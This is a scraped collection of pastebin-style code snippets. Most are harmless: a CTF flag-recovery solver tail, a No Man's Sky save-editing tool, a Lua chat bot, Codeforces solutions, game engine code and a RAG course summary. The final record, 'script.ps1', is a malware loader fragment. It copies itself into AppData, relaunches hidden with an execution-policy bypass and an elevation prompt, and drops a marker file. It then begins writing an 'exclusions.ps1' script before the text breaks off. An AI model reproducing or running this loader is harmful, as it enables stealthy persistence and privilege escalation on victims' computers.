    PK1 = (paX + 17*bidx + 91) & 0xFF
    SP = ksa_mod(97, [PK0, PK1])  # ASM: init_SP / ksa_sp
    RND = prga_mod(SP, 97, lenb)  # ASM: prga_sp -> RND

    blk = block_cand[:]
    # La permutation directe est descendante -> pour inverser, on parcourt en ordre croissant (BADRING en sens inverse)
    for idx in range(lenb):
        j = RND[idx] % (idx + 1)
        blk[idx], blk[j] = blk[j], blk[idx]

    # 2: Annuler le rolling XOR (si activé, l'inverse de do_roll dans tombola si use_roll)
    _, use_billy, use_roll = flags_for_block(bidx)
    if use_roll:
        acc = (paX + 3*bidx + 17) & 0xFF
        step = (paX + 5*bidx + 1) & 0xFF
        for i in range(lenb):
            y = blk[i]
            x = y ^ acc
            blk[i] = x
            acc = (acc + x + step) & 0xFF

    # 3: Annuler la substitution (si activée, l'innverse de stage_billy/billy_apply)
    # 3: ASM: stage_billy -> do_billy -> billy_apply : substitution via billy[base+byte]
    if use_billy:
        idx_slice = billy_slice_index(bidx)
        base = 256 * idx_slice
        sbox = billy[base:base + 256]
        inv = [0]*256
        for x, y in enumerate(sbox):
            inv[y] = x
        blk = [inv[val] for val in blk]

    # 4: Annuler le masquage (double XOR avec flux RC4, prga_mask)
    # ASM: prga_mask : double XOR RC4 (mod 97 puis mod 89)
    KA0 = (paX + 7*bidx + 11) & 0xFF
    KA1 = (paX ^ 0xA5) & 0xFF
    SA = ksa_mod(97, [KA0, KA1])
    kA = prga_mod(SA, 97, lenb)

    KB0 = (paX + 9*bidx + 23) & 0xFF
    KB1 = (5*paX + 0x3D) & 0xFF
    SB = ksa_mod(89, [KB0, KB1])
    kB = prga_mod(SB, 89, lenb)

    for i in range(lenb):
        blk[i] ^= kA[i]
        blk[i] ^= kB[i]

    return blk

# ----- Reconstruit tout l'input (les 65 bytes) bloc par bloc, ASM: checkin / blk_check / do_block / store_block / hotdogs
IN_recovered = [0]*FLEN
offset = 0
bidx = 0
while offset < FLEN:
    lenb = min(BLKSZ, FLEN - offset)
    block_cand = c5d[offset:offset + lenb]
    block_in = invert_block(block_cand, bidx)
    IN_recovered[offset:offset + lenb] = block_in
    offset += lenb
    bidx += 1

# ----- Affiche le résultat final.
flag = ''.join(chr(b) for b in IN_recovered)
print(""Flag:"", flag)
# Flag : flag{br3_unsTuUc7-d4_c3LInG_f4N_y33t--br00_1nStRuCT10N5_n0W_Cl3R}"
ZWuKgBMs,rePosition a NoMansSky Corvette,crispyking,Python,Sunday 19th of October 2025 04:31:20 PM CDT,"#!/usr/bin/python
""""""rePosition: read a NMS PersistentPlayerBases JSON array entry
    and add an offset to every Position entry in its Objects[] array.

    This is to re-align a Corvette ship to the station hangar's grid
    (which somehow got shifted in an update Sep 2025...?)

    Python Versions tested: 3.9

    Host OS Dependencies:

""""""

#==============================================================================
# Imports and definitions
from __future__ import print_function
import sys
import argparse
import json


#==============================================================================
# Args
def handle_args():
    """"""Parse args and return the resulting Namespace object.""""""

    parser = argparse.ArgumentParser(
        description=""rePosition items in an Objects array in a JSON file."",
        formatter_class=lambda prog: argparse.RawDescriptionHelpFormatter(
            prog, max_help_position=35),
        # NB: use add_help=False to prevent auto -h/--help
        epilog='''
This is to re-position an off-center Corvette in the hangar's build area
so that the ship's landing gear is located correctly on the grid it snaps to.

It reads from standard input (or -f FILE) and writes to standard output.

The Position property in Objects[] is in the order (y,z,x), where
positive x is in the direction toward front of the ship and
(0,0,0) is the yellow central crosshairs on the deck of the station build area.

To use this you need to know the (y,z,x) position of the object you want
positioned at exactly the center so it can be subtracted from every object.
To find this:
  1. First name your ship something besides the procedurally-generated name.
  2. Open the Raw JSON using NMSSaveEditor or NomNom.
  3. Open BaseContext/PlayerStateData
  3. Look in ShipOwnership for the entry with your name.  Remember the index.
  4. Look in PersistentPlayerBases for the entry with ""UserData"":<index>.
  5. Look for Objects entries with ObjectID = ^B_LND_xx; these are the
     landing gear.
     Find the one closest to the center (0,0,0) and remember its Position
     (y,z,x) to use as parameters to this program.
     If you don't have one in the center, you can work out the offset:
     the grid spacing is 4.0, so you can calculate the intended
     Position of your gear, and subtract that from the actual Position in
     the JSON to get the offset you need to use as parameters for this program.
  6. Copy the entire entry to use as input to this program.
  7. Run this program with the -O option and the offset parameters.
  8. Replace the Objects[] array in the entry with the output.
''')

    # Options
    parser.add_argument(
        '-d', '--debug', action='count',
        help=""Enable debug output and DEBUG logging to stderr."")
    parser.add_argument(
        '-v', '--verbose', action='count', default=1,
        help='''Increase verbosity (default=%(default)s/WARN).
The effective verbosity is the maximum of this and any defined in the
config file.
''')
    parser.add_argument(
        '-q', '--quiet', action='count', default=0,
        help=""Decrease verbosity."")
    parser.add_argument(
        '-n', '--norun', action='store_true',
        help=""Display what would be done instead of doing it."")
    parser.add_argument(
        '-D', '--dump', action='store_true',
        help=""Dump the active args and config and exit."")
    #parser.add_argument('-h', '--help', action='help')
    parser.add_argument('-f', '--file', dest='file',
                        default='-',
                        help=""Read JSON from FILE instead of stdin."")
    parser.add_argument(
        '-O', '--objects', action='store_true',
        help=""Only output the Objects array, ready to paste."")

    # Required positional args; NB: NMS Position order is (y, z, x)
    parser.add_argument('y', type=float )
    parser.add_argument('z', type=float )
    parser.add_argument('x', type=float )


    args = parser.parse_args()

    # fix verbose/quiet
    args.verbose -= args.quiet

    return args

#==============================================================================
def main():
    """"""The main program.  Parse args, initialize and run.""""""
    args = handle_args()

    if args.dump:
        print(""args:"")
        print(json.dumps(vars(args), indent=4))
        # sys.exit(0)


    # Read JSON
    with open(args.file, 'r') if args.file != ""-"" else sys.stdin as f:
        data = json.load(f)

    if args.dump:
        print(""data:"")
        print(json.dumps(data, indent=4))
        sys.exit(0)


    # Process Objects[]
    for obj in data['Objects']:
        pos = obj['Position']
        # re-Position it
        pos[0] = pos[0] - args.y
        pos[1] = pos[1] - args.z
        pos[2] = pos[2] - args.x


    # Write JSON
    with sys.stdout as f:
        if args.objects:
            objstr = json.dumps({""Objects"": data['Objects']}, indent=4)
            objstr = objstr[2:-2]   # get rid of enclosing curly braces and nl
            objstr += "",\n""         # ready to paste
            sys.stdout.write(objstr)
        else:
            sys.stdout.write(json.dumps(data, indent=4))


#==============================================================================
if __name__ == ""__main__"":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(""caught interrupt"")
"
cgPtwbQe,Fart,ACheats,Lua,Sunday 19th of October 2025 02:23:33 PM CDT,"local caller = getScriptCaller()

local fart_types = {
  ""тихий, но смертоносный 💨"",
  ""мощный, с эхом по всей комнате 💥"",
  ""протяжный, как труба судного дня 📯"",
  ""осторожный, но подозрительно вонючий 🐍"",
  ""короткий, но звонкий как выстрел 🎯"",
  ""неожиданный, даже для тебя самого 😳"",
  ""с душой, прямо от сердца ❤️💨"",
  ""легендарный, оставивший след в истории 🏆"",
  ""пропитанный гордостью и фасолью 🫘"",
  ""едва слышный, но смертельно токсичный ☠️""
}

local fart_smells = {
  {name = ""свежий, как утренняя роса 🌸"", toxicity = 0},
  {name = ""немного подозрительный 😶‍🌫️"", toxicity = 1},
  {name = ""резкий, с привкусом фасоли 🫘"", toxicity = 2},
  {name = ""зловонный, заставил всех отвернуться 🤢"", toxicity = 3},
  {name = ""токсичный, зафиксирован на радарах НАТО ☣️"", toxicity = 4},
  {name = ""радиоактивный, оставил ожоги воздуха ☢️"", toxicity = 5}
}

function signRoll(num)
  local n = math.random(1,10)
  if n <= 7 then
    return num
  end
  return -num
end

function getDelta()
  local t = {}
  t.current = getLocalData(tostring(caller.id))
  if not t.current then t.current = 0 end
  t.delta = math.random(0, 10)
  t.delta = signRoll(t.delta)
  if t.current + t.delta < 0 then
    t.delta = -t.current
    t.current = 0
  else
    t.current = t.current + t.delta
  end
  setLocalData(tostring(caller.id), t.current)
  return t
end

function updateTime()
  setLocalData(tostring(caller.id) .. 'time', os.time())
end

function checkTime()
  local time = getLocalData(tostring(caller.id) .. 'time')
  if not time then
    setLocalData(tostring(caller.id), 0)
    updateTime()
    return true
  end
  if time and os.time() - tonumber(time) > 24*60*60 then
    updateTime()
    return true
  end
  return false 
end

function fart()
  if isChat() then
    local tag = ''
    if caller.username then
      tag = '@' .. caller.username .. ' '
    elseif caller.first_name then
      tag = caller.first_name .. ' '
    end
    if checkTime() then
      local t = getDelta()
      local fart_type = fart_types[math.random(1, #fart_types)]
      local fart_smell = fart_smells[math.random(1, #fart_smells)]
      
      local str = tag
      if t.delta < 0 then
        str = str .. 'сегодня пукнул слабее на ' .. -t.delta .. ' очков 💨\n'
      elseif t.delta == 0 then
        str = str .. 'сегодня не пукал. 😶\n'
      else
        str = str .. 'пукнул сильнее на ' .. t.delta .. ' очков! 💪\n'
      end
      
      str = str .. 'Тип пука: ' .. fart_type .. '\n'
      str = str .. 'Запах: ' .. fart_smell.name .. '\n'
      str = str .. 'Токсичность: ' .. fart_smell.toxicity .. '/5 ☠️\n'
      str = str .. 'Общий рейтинг пуков: ' .. t.current .. ' 💨'
      return str
    else
      return os.date(tag .. 'ты уже пукал сегодня! Возвращайся через %H часов %M минут 💨', 45*60*60 - os.time() + tonumber(getLocalData(tostring(caller.id .. 'time'))))
    end
  else
    return 'Юзай в чате, чтобы все услышали твой пук! 💨'
  end
end

function printTop()
  local t = getAllUserData()
  local s = '💨 ТОП ПУКАНОВ ЧАТА 💨\n\n'
  if not getUserCount() then
    return 'Используй в конфе!'
  end
  for i = 1, getUserCount() do
    if t[i] and t[i].id and getLocalData(tostring(t[i].id)) then
      t[i].score = tonumber(getLocalData(tostring(t[i].id)))
    else
      t[i] = nil
    end
  end
  local c = {}
  for i = 1, getUserCount() do
    if t[i] then
      table.insert(c, t[i])
    end
  end
  table.sort(c, function(a,b) return a.score > b.score end)
  for i = 1, #c do
    if c[i].first_name then
      s = s .. i .. '. ' .. c[i].first_name .. ' — ' .. c[i].score .. ' очков пука 💨\n'
    end
  end
  return s
end

if _ARGS == 'top' or _ARGS == 'топ' then
  return printTop()
end

return fart()"
p2dPAKEh,RAG Crash Course for Beginners,AmourSpirit,Markdown,Sunday 19th of October 2025 01:22:36 PM CDT,"# RAG Crash Course for Beginners

## Summary

Based on the transcript, this video is a comprehensive educational course about RAG (Retrieval-Augmented Generation) systems. Here's a clear summary:

**Course Overview**
This video provides a complete introduction to RAG systems, designed for beginners with no prior AI or programming knowledge. The course combines theoretical explanations with hands-on labs that run directly in the browser.

**Core Concepts Covered**

**What is RAG?**
RAG stands for Retrieval-Augmented Generation and solves the problem of AI models providing incorrect or generic answers by:
- **Retrieval**: Finding relevant information from documents
- **Augmentation**: Adding that information to the user's prompt
- **Generation**: Having the AI generate accurate responses using the retrieved context

The course uses a practical example of building a ""policy copilot"" chatbot that answers employee questions about company policies.

**Key Components Explained**

1. **Search Methods**:
   - **Keyword Search**: Traditional search using exact word matching (TF-IDF, BM25)
   - **Semantic Search**: Understanding meaning using embedding models

2. **Embedding Models**:
   - Convert text to numerical vectors representing meaning
   - Local models (Sentence Transformers) vs. API models (OpenAI)
   - Demonstrated using the all-miniLM-L6-v2 model

3. **Vector Databases**:
   - Efficiently store and search embeddings
   - Introduced ChromaDB for learning and Pinecone for production

4. **Document Chunking**:
   - Breaking large documents into smaller, searchable pieces
   - Strategies: fixed-size chunks, sentence-based, paragraph-based
   - Importance of overlap to preserve context

**Production Considerations**
The course covers essential production topics:
- **Caching**: Multiple levels (query, embedding, search, LLM response)
- **Monitoring**: Tracking response times, error rates, retrieval quality
- **Error Handling**: Graceful degradation and fallback strategies
- **Architecture**: Complete production setup with microservices and monitoring

**Hands-on Approach**
The course emphasizes practical learning with instant browser-based labs that allow students to:
- Practice keyword and semantic search
- Work with embedding models
- Implement vector databases
- Build complete RAG pipelines
- No environment setup required

The video positions RAG as a powerful solution for dynamic, factual information retrieval while acknowledging it's not suitable for all AI problems - recommending prompt engineering for behavior control and fine-tuning for stable patterns like communication style.

## Details

- Duration: 58m 50s
- URL: [RAG Crash Course for Beginners](https://www.youtube.com/watch?v=swvzKSOEluc)

## Tags
- RAG
- RetrievalAugmentedGeneration
- AIBeginners
- VectorDatabases
- SemanticSearch
- EmbeddingModels
- DocumentChunking
- ProductionAI
- YouTube
- Video
- LocalLLM,LocalAI
"
DCvc421G,CF2154C1 WA,pb_jiang,C++,Sunday 19th of October 2025 01:22:24 PM CDT,"// Problem: C1. No Cost Too Great (Easy Version)
// Contest: Codeforces - Codeforces Round 1060 (Div. 2)
// URL: https://codeforces.com/contest/2154/problem/C1
// Memory Limit: 256 MB
// Time Limit: 3000 ms
//
// Powered by CP Editor (https://cpeditor.org)

#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

namespace rngs = std::ranges;
using ll = long long;
using a2l = array<ll, 2>;
using vl = vector<ll>;

void solve2()
{
    ll n;
    cin >> n;
    vl a(n), b(n);
    for (auto &x : a)
        cin >> x;
    for (auto &x : b)
        cin >> x;
}

vl ps;

void solve()
{
    ll n, ecnt = 0;
    cin >> n;
    vl a(n), b(n);
    map<ll, ll> pcnt, p1cnt;
    for (auto &x : a)
        cin >> x;
    for (auto &x : b)
        cin >> x;

    for (auto x : a) {
        for (auto f : ps) {
            if (f * f > x) {
                if (std::binary_search(ps.begin(), ps.end(), x))
                    pcnt[x] += 1;
                if (std::binary_search(ps.begin(), ps.end(), x + 1))
                    p1cnt[x + 1] += 1;
                break;
            }

            if (x % f == 0)
                pcnt[f] += 1;
            if ((x + 1) % f == 0)
                p1cnt[f] += 1;
        }
    }

    ll val = 2;
    for (auto [k, v] : pcnt) {
        if (v >= 2)
            dbg(k, v, val), val = 0;
        if (v == 1 && p1cnt.count(k))
            val = min(val, 1ll);
        if (p1cnt.count(k) && p1cnt[k] >= 2)
            val = min(val, 2ll);
        // val = min(val, 2 - min(v, 2ll));
    }

    cout << val << '\n';
}

int main(int argc, char **argv)
{
    std::ios::sync_with_stdio(false);
    std::cin.tie(nullptr);

    for (ll i = 2; i < 2e5 + 3; ++i) {
        bool is_prime = true;
        for (ll j = 2; j * j <= i && is_prime; ++j)
            if (i % j == 0)
                is_prime = false;
        if (is_prime)
            ps.push_back(i);
    }

    ll t = 1;
    cin >> t;
    while (t--)
        solve();

    return 0;
};
"
kib2PHV3,C1-Bilol_Abdilxayev,Bilolabdulkhayev2006,C++,Sunday 19th of October 2025 12:30:30 PM CDT,"#include <bits/stdc++.h>
using namespace std;
using ll = long long;
 
vector<int> sieve_primes(int limit) {
    vector<char> is_prime(limit + 1, true);
    vector<int> primes;
    is_prime[0] = is_prime[1] = false;
    for (int i = 2; i <= limit; ++i) {
        if (is_prime[i]) {
            primes.push_back(i);
            if ((ll)i * i <= limit) {
                for (int j = i * i; j <= limit; j += i) is_prime[j] = false;
            }
        }
    }
    return primes;
}
 
vector<ll> factor_unique(ll x, const vector<int>& primes) {
    vector<ll> res;
    for (int p : primes) {
        if ((ll)p * p > x) break;
        if (x % p == 0) {
            res.push_back(p);
            while (x % p == 0) x /= p;
        }
    }
    if (x > 1) res.push_back(x);
    return res;
}
 
int main() {
    ios::sync_with_stdio(false);
    cin.tie(nullptr);
    int T;
    if (!(cin >> T)) return 0;
 
    int sieve_limit = 200000;
    auto primes = sieve_primes(sieve_limit);
 
    while (T--) {
        int n;
        cin >> n;
        vector<ll> a(n);
        vector<ll> b(n);
        for (int i = 0; i < n; ++i) cin >> a[i];
        for (int i = 0; i < n; ++i) cin >> b[i];
 
        unordered_map<ll, vector<int>> orig_idx;
        unordered_map<ll, vector<int>> plus_idx;
 
        for (int i = 0; i < n; ++i) {
            auto facs = factor_unique(a[i], primes);
            for (ll p : facs) orig_idx[p].push_back(i);
 
            auto facs_plus = factor_unique(a[i] + 1, primes);
            for (ll p : facs_plus) plus_idx[p].push_back(i);
        }
 
        bool zero = false;
        for (auto &kv : orig_idx) {
            if (kv.second.size() >= 2) { zero = true; break; }
        }
        if (zero) {
            cout << 0 << '\n';
            continue;
        }
 
        bool one = false;
        for (auto &kv : plus_idx) {
            ll p = kv.first;
            const auto &plusvec = kv.second;
 
            if (!orig_idx.count(p)) continue;
            const auto &origvec = orig_idx[p];
 
            if (origvec.empty()) continue;
            int idx0 = origvec[0];
            for (int j : plusvec) {
                if (j != idx0) { one = true; break; }
            }
            if (one) break;
        }
        if (one) {
            cout << 1 << '\n';
            continue;
        }
 
        
        cout << 2 << '\n';
    }
    return 0;
}"
fZSsNGz0,Untitled,3x3cvte,Python,Sunday 19th of October 2025 12:18:24 PM CDT,"import pandas as pd

# Загрузка файла
df = pd.read_csv(""diamonds.csv"")

print(""Ответы теста EDA HW pract"")
print(""---"")
print()

num_rows = df.shape[0]
print(""Количество строк в датасете:"", num_rows)
print(""---"")

missing_cut = df['Cut'].isna().sum()
print(""Пропущенных значений в столбце Cut:"", missing_cut)
print(""---"")

mean_price = round(df['Price'].mean())
print(""Среднее значение Price:"", mean_price)
print(""---"")

median_price = df['Price'].median()
print(""Медианное значение Price:"", median_price)
print(""---"")

min_carat = df['Carat Weight'].min()
max_carat = df['Carat Weight'].max()

print(""минимальное и максимальное значение Carat Weight:"")
print(f""{min_carat} ; {max_carat}"")
print(""---"")

# Средняя цена по каждой форме
mean_price_by_shape = df.groupby('Shape')['Price'].mean()

# Форма с максимальной средней ценой
shape_max_price = mean_price_by_shape.idxmax()
print(""Форма с самой высокой средней ценой:"", shape_max_price)
print(""---"")

# Средняя цена по каждому цвету
mean_price_by_color = df.groupby('Color')['Price'].mean()

# Цвет с минимальной средней ценой
color_min_price = mean_price_by_color.idxmin()
print(""Цвет с наименьшей средней ценой:"", color_min_price)
print(""---"")

corr = df['Carat Weight'].corr(df['Price'])
print(""Корреляция:"", round(corr, 2))
print(""---"")

mean_depth = round(df['Depth %'].mean(), 1)
print(""Среднее значение Depth %:"", mean_depth)
print(""---"")

mean_price_by_type = df.groupby('Type')['Price'].mean()

# Тип с максимальной средней ценой
type_max_price = mean_price_by_type.idxmax()
print(""Тип с более высокой средней ценой:"", type_max_price)
print(""---"")"
bxgB4PBa,The Sweet Kitty Motions (platformer push/carry movement),sylvie_ln,Game Maker,Sunday 19th of October 2025 12:11:50 PM CDT,"function move_init() {
  moveable = false;  // can be pushed or carried
  can_push = false;  // can push things
  can_carry = false; // can carry things
  carry_dist = {l:0, r:0} // how far the object has been carried left or right
  subpixel=[0,0]; 
  collision_at = function(xp,yp) {
    // can override for custom collision behaviour
    return !place_free(xp,yp);
  }
}

// call this in begin step, it should run every frame before calls to move
function move_bstep() {
  if moveable {
    carry_dist = {l:0,r:0}
  }
}

// internal function for resetting positions after a push fails
function _move_reset(reset) {
  if is_array(reset) {
    for(var i=0; i<array_length(reset); ++i) {
      var data = reset[i]; 
      if instance_exists(data.id) {
        data.id.x = data.x;
        data.id.y = data.y;
      }
    }
  }
}

function move(amount, axis) {
  // split the amount into pixel movement (target) and subpixel movement
  // we use ceil(n - 1/2) instead of round(n) so that round(#.5) always rounds down
  // ensures subpixel range is precisely -0.5 <= subpixel < 0.5
  // this is important for vertical carrying, if i remember right
  var target = ceil(subpixel[axis] + amount - 1/2);
  subpixel[axis] += amount - target;

  // shorthands:
  var xa = 1-axis;       // true if we're moving on the x-axis
  var ya = axis;         // true if we're moving on the y-axis
  var s = sign(target);  // direction of movement

  // temporaries:
  var souls = undefined; // holds other pushable/carriable objects we collide with
  var reset = undefined; // holds reset info, if we need to take back a sequence of moves
  var dist = 0;          // total pixel distance we have moved 

  // now move towards the target, one pixel at a time
  while target != 0 {

    // before moving, try to push objects out of the way
    if (xa and can_push)                              // pushing horizontally
    or ((ya and s < 0) and can_carry)                 // or carrying an object on top of us
    or ((ya and s > 0) and can_push and !moveable) {  // or pushing an object below us
      // clear the reset data
      reset = [];
      // we temporarily toggle our moveableness off
      // it's to avoid infinite loops (the thing we push tries to push us, etc.)
      var moveable_restore = moveable;
      moveable = false;

      // gather all souls in our path and push them
      souls = instance_place_array(x+xa*s,y+ya*s,oSoul);
      for(var i=0; i<array_length(souls); ++i) {
        var soul = souls[i];
        // if we can push the soul, try to push it
        if soul.moveable {
          // add the soul to the reset data, in case we need to revert the push
          array_push(reset,{id: soul.id, x:soul.x, y:soul.y});
          // now do the actual push
          // note that this might recursively push or carry other things!
          with soul {
            move(s,axis); 
          }
        }
      }

      // restore our original moveable status
      moveable = moveable_restore;
    }

    // now, check for a collision one step ahead
    if collision_at(x+xa*s,y+ya*s) {
      // we hit something, abort!

      // this first part is optional
      // you can do a collision callback for any souls you collided with
      souls = instance_place_array(x+xa*s,y+ya*s,oSoul);
      for(var i=0; i<array_length(souls); ++i) {
        var soul = souls[i];
        with soul {
          with other {
            // callback goes here
            // ""self"" is the soul that move was called on
            // ""other"" is the soul we collided with
            // on_collide(xa,ya,s); 
          }
        }
      }

      // this part is not optional
      // if we pushed things, but then were unable to move ourselves,
      // that means the push failed at some point
      // reset the positions of everything we pushed
      if can_push {
        _move_reset(reset); 
      }
 
      // this part comes down to personal preference
      // when you hit a wall there are various things you can do with subpixels
      // set to 0, set to bounds of subpixel range, do nothing etc.
      subpixel[axis] = 0

      // returning true indicates movement was successful
      // returning false indicates we hit something
      // you could customize this to return more complex data if you need it
      return false;  
    }

    // there is nothing in our way, so we're going to move
    // before moving, determine what needs to be carried
    // we only carry objects that are riding on top of us
    if can_carry {
      souls = instance_place_array(x,y-1,oSoul);
    }

    // finally, we actually move one pixel
    x += xa*s;
    y += ya*s;
    target -= s;
    dist++;

    // now that we've moved, carry things along with us
    if can_carry {
      // again we temporarily toggle our moveableness off 
      // to avoid infinite carry loops
      var moveable_restore = moveable;
      moveable = false;
 
      // finally, carrying time
      for(var i=0; i<array_length(souls); ++i) {
        var soul = souls[i];
        if soul.moveable {
          with soul {
            if xa { // if we're carrying to the left or right
              // we keep track of the maximum distance, per-step, the object has been carried
              // separate left and right distances are tracked, the count is reset in begin step
              // we only do the carry if it will increase the maximum distance in that direction
              // why? this is to avoid the ""double carry problem"":
              // imagine a soul is standing on top of two souls, both moving left
              // the soul on top gets carried 2px for every 1px the bottom ones move, this shouldn't happen
              // i don't have a mathematical proof this carry rule is correct or anything
              // but i think it worked well in my experiments
              // anyways
              if s < 0 {
                if dist > carry_dist.l {
                  carry_dist.l++;
                  move(s,axis);
                }
              } else {
                if dist > carry_dist.r {
                  carry_dist.r++;
                  move(s,axis);
                }
              }
            } else if ya { 
              // only triggers if we're carrying downwards (an upwards carry is a push)
              move(s,axis); 
            }
          }
        }
      }
      
      // restore moveable status
      moveable = moveable_restore;
    }
  }

  // we're out of the while loop which means we moved the full target distance without hitting anything
  return true;
}"
46bZW1j6,How to Load TMP with tags use Addressables,waygeek,C#,Sunday 19th of October 2025 10:50:04 AM CDT,"using System.Collections.Generic;
using Cysharp.Threading.Tasks;
using UnityEngine;
using UnityEngine.Localization;
using UnityEngine.Localization.Settings;
using UnityEngine.AddressableAssets;
using UnityEngine.ResourceManagement.AsyncOperations;
using WayHeart.Infrastructure.State;
using WayHeart.Service.Audio;
using Constant;
using WayHeart.Service.Loader;
using TMPro;

public class BootstrapState : IStateGame
{
    private readonly GameStateMachine _gameStateMachine;
    private readonly AudioService _audioService;
    readonly AssetLoader _assetLoader;

    public BootstrapState(GameStateMachine gameStateMachine, AudioService audioService, AssetLoader assetLoader)
    {
        _gameStateMachine = gameStateMachine;
        _audioService = audioService;
        _assetLoader = assetLoader;
    }

    public async UniTask Enter()
    {
        await StartBackgroundResourceLoading();
        
        await _gameStateMachine.Enter<LoadMainMenuState>();
    }

    public UniTask Exit()
    {
        return UniTask.CompletedTask;
    }

    private async UniTask StartBackgroundResourceLoading()
    {
        _assetLoader.LoadAssetAsync<AudioClip>(ConstantAudioName.DefaultClick).Forget();
        _assetLoader.LoadAssetAsync<AudioClip>(ConstantAudioName.DefaultDeny).Forget();

        _audioService.Ambient.PlayWhenReadyAsync(ConstantAudioName.MainMenuAmbient, true).Forget();

        // Завантажуємо шрифти та локалізацію паралельно
        await UniTask.WhenAll(
            LoadFontsAsync(),
            LoadLocalization()
        );
    }

    private async UniTask LoadLocalization()
    {
        await LocalizationSettings.InitializationOperation;

        LoadSavedLanguage();

        await PreloadMainMenuTables();
    }

    private void LoadSavedLanguage()
    {
        string savedLangCode = PlayerPrefs.GetString(""SelectedLanguage"", """");

        if (!string.IsNullOrEmpty(savedLangCode))
        {
            Locale savedLocale = LocalizationSettings.AvailableLocales.GetLocale(new LocaleIdentifier(savedLangCode));

            if (savedLocale != null)
            {
                LocalizationSettings.SelectedLocale = savedLocale;
                return;
            }
        }

        Locale deviceLocale = LocalizationSettings.AvailableLocales.GetLocale(Application.systemLanguage);

        LocalizationSettings.SelectedLocale = 
            deviceLocale != null ? deviceLocale : LocalizationSettings.AvailableLocales.Locales[0];
    }

    private async UniTask PreloadMainMenuTables()
    {
        var stringDatabase = LocalizationSettings.StringDatabase;

        var mainMenuTable = stringDatabase.GetTableAsync(ConstantLocalizationTabelName.MainMenu).ToUniTask();
        var popupTable = stringDatabase.GetTableAsync(ConstantLocalizationTabelName.Popup).ToUniTask();

        await UniTask.WhenAll(mainMenuTable, popupTable);
    }

    /// <summary>
    /// Завантажує TextMesh Pro шрифти через Addressables.
    /// Шрифти необхідні для TMP Fallback системи (емоджі та тег font) і мають бути в пам'яті до показу UI.
    /// </summary>
    private async UniTask LoadFontsAsync()
    {
        // Назви шрифтів з Addressables
        string[] fontNames = new[]
        {
            ""FramerSans300 SDF"",
            ""FramerSans400 SDF"",
            ""FramerSans600 SDF""
        };

        // Завантажуємо всі шрифти паралельно та отримуємо результати через кортежі
        var (font300, font400, font600) = await UniTask.WhenAll(
            LoadSingleFontAsync(fontNames[0]),
            LoadSingleFontAsync(fontNames[1]),
            LoadSingleFontAsync(fontNames[2])
        );

        // Перевіряємо що всі шрифти успішно завантажились
        if (font300 != null && font400 != null && font600 != null)
        {
            // Оновлюємо TMP Settings щоб теги <font=""FontName""> працювали з новими екземплярами шрифтів
            TMP_Settings.fallbackFontAssets = new List<TMP_FontAsset> { font300, font400, font600 };
            TMP_Settings.defaultFontAsset = font300;

            // Оновлюємо внутрішню таблицю TMP для пошуку шрифтів через теги <font>
            MaterialReferenceManager.AddFontAsset(font300);
            MaterialReferenceManager.AddFontAsset(font400);
            MaterialReferenceManager.AddFontAsset(font600);
        }
        else
        {
            Debug.LogWarning(""❌ Не всі шрифти завантажились. TMP Settings не оновлено."");
        }
    }

    /// <summary>
    /// Завантажує окремий TMP шрифт через Addressables.
    /// При помилці логує її, але не блокує загрузку (graceful degradation).
    /// </summary>
    private async UniTask<TMP_FontAsset> LoadSingleFontAsync(string fontName)
    {
        try
        {
            var handle = Addressables.LoadAssetAsync<TMP_FontAsset>(fontName);
            await handle.ToUniTask();

            if (handle.Status == AsyncOperationStatus.Succeeded)
            {
                Debug.Log($""✓ Завантажено шрифт: {fontName}"");
                return handle.Result;
            }
            else
            {
                Debug.LogWarning($""❌ Помилка завантаження шрифту {fontName}: {handle.OperationException}"");
                return null;
            }
        }
        catch (System.Exception ex)
        {
            // Не блокуємо запуск гри при помилці завантаження шрифтів
            Debug.LogWarning($""❌ Помилка завантаження шрифту {fontName}: {ex.Message}"");
            return null;
        }
    }
}
"
PMaEHmf3,Untitled,3327107649,JSON,Sunday 19th of October 2025 09:49:06 AM CDT,"{
  ""version"": ""v2.2.0"",
  ""versionCode"": 20251019,
  ""zipUrl"": ""https://54188-1348480182.cos.ap-nanjing.myqcloud.com/MultiGameCleaner.zip"",
  ""changelog"": ""https://54188-1348480182.cos.ap-nanjing.myqcloud.com/README.md""
}"
STyBrwUt,Untitled,3327107649,JSON,Sunday 19th of October 2025 09:37:13 AM CDT,"{
  ""version"": ""v2.4.0"",
  ""versionCode"": 20251019,
  ""zipUrl"": ""https://54188-1348480182.cos.ap-nanjing.myqcloud.com/MultiGameCleaner.zip"",
  ""changelog"": ""https://54188-1348480182.cos.ap-nanjing.myqcloud.com/README.md""
}"
R5mC3CKX,ДЗ: Динамический массив,NikaBang,C#,Sunday 19th of October 2025 09:16:15 AM CDT,"internal class Program
{
    static void Main(string[] args)
    {
        int[] array = new int[1];
        int[] tempArray = new int[array.Length + 1];

        for (int i = 0; i < array.Length; i++)
        {
            tempArray[i] = array[i];
        }
    }
}"
79nkyS7i,script.ps1,Marc1n,PowerShell,Sunday 19th of October 2025 09:06:09 AM CDT,"param([switch]$FromLoader)

$ErrorActionPreference = 'SilentlyContinue'

function IsAdmin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

$appData = $env:APPDATA
$localAppData = $env:LOCALAPPDATA
$tmp = $env:TEMP
$selfPath = $MyInvocation.MyCommand.Path
$markerPath = Join-Path $tmp 'admin.tmp'
$targetPath = Join-Path $appData (Split-Path -Leaf $selfPath)

if ($selfPath -ne $targetPath) {
    Copy-Item -Path $selfPath -Destination $targetPath -Force
}

$args = $args -join ' '

if (Test-Path $markerPath -and -not ($args -like '*--fromloader*')) { exit }

if (-not (IsAdmin) -and -not ($args -like '*--fromloader*')) {
    Start-Process -FilePath 'cmd.exe' -ArgumentList ""/c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `""$selfPath`"" --fromloader --detached"" -Verb RunAs -WindowStyle Hidden
    exit
}

if (-not ($args -like '*--detached*')) {
    Start-Process -FilePath 'powershell.exe' -ArgumentList ""-WindowStyle Hidden -ExecutionPolicy Bypass -File `""$selfPath`"" --fromloader --detached"" -WindowStyle Hidden
    exit
}

New-Item -Path $markerPath -ItemType File -Force | Out-Null


$exclScriptPath = Join-Path $appData ""exclusions.ps1""

$exclScript = @'
